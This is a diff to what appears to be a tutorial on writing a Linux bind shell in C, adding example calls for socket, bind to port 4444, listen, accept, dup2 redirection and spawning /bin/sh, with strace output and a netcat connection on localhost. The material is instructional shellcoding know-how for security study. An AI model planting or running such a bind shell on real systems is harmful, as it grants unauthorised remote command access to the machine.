@@ -73,6 +73,8 @@ root
 
 ```c 
 int socket(int domain, int type, int protocol); 
+
+int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 ```  
 + For complete details see: `man socket`
 
@@ -104,6 +106,12 @@ struct sockaddr_in {
 struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
 }; 
+
+struct sockaddr_in ipSocketAddr = { 
+  .sin_family = AF_INET, 
+  .sin_port = htons(4444), 
+  .sin_addr.s_addr = htonl(INADDR_ANY) 
+};
 ```
 + For complete details see: `man ip.7`  
 
@@ -129,6 +137,8 @@ struct in_addr sin_addr = htonl(INADDR_ANY)
 #### 3. Bind the IP Socket Address to Socket. 
 ```c
 int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`
+
+bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
 ```
 + For complete details see: `man bind`  
 
@@ -153,6 +163,8 @@ socklen_t addrlen = sizeof(ipSocketAddr)
 #### 4. Listen for connections to the TCP Socket at the IP Socket Address.  
 ```c
 int listen(int sockfd, int backlog);
+
+listen(ipv4Socket, 0);
 ```  
 + For complete details see: `man listen`  
 
@@ -171,6 +183,8 @@ int backlog = 0
 #### 5. Accept connections to the TCP-IP Socket and create a Client Socket.  
 ```c
 int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
+
+int clientSocket = accept(ipv4Socket, NULL, NULL);
 ```  
 + For complete details see: `man accept`  
 
@@ -202,7 +216,13 @@ dup2(clientSocket, 0); // STDIN
 dup2(clientSocket, 1); // STDOUT
 dup2(clientSocket, 2); // STDERR
 ```   
-+ For complete details see: `man dup2`  
++ For complete details see: `man dup2` 
++ We will need to call this function 3 times to transfer Standard Input, Standard Output and Standard Error
+
+##### dup2() parameters
+```c
+const char *pathname = "/bin/sh"
+```
 
 #### 7. Spawn a `/bin/sh` shell for the client, in the connected session.  
 ```c
@@ -217,21 +237,22 @@ const char *pathname = "/bin/sh"
 ```
 
 ```c
-char *const argv[] = NULL`  
+char *const argv[] = NULL
 ```
 
 ```c
-char *const envp[] = NULL`  
+char *const envp[] = NULL
 ```
 
 ### Trace System-Calls  
 Use `strace` to see system calls as the `shellcode` executes.  
++ _I removed all of the system-calls that were irrelevant from the system trace output._
 
 ```bash 
 root# strace ./bindshell
 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 ```  
-+ We see that the `Socket File-Descriptor` for our socket.
++ The returned `Socket File-Descriptor` for our new socket is '3'.
 
 ```bash
 bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
@@ -239,8 +260,8 @@ listen(3, 0)                            = 0
 accept(3, NULL, NULL
 
 ```
-+ We can see it hangs at `accept(`. To keep it moving we connect to our bindshell with `nc 127.0.0.1 4444`.  
-+ I removed all of the system-calls that were irrelevant from the system trace.  
++ We can see our program hangs at `accept(`. 
++ To satisfy the accept function,  we connect with `nc 127.0.0.1 4444`.  
 
 ```bash
 accept(3, NULL, NULL)                   = 4
